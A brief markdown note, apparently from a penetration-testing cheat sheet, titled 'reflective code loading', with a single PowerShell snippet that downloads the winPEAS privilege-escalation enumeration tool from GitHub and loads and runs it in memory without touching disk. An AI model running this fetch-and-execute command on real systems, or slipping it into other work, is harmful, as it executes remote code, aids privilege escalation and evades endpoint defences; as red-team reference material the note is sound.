---
title: reflective code loading
weight: 20
---

# powershell
----------------

```powershell
$url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"

$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("log")

```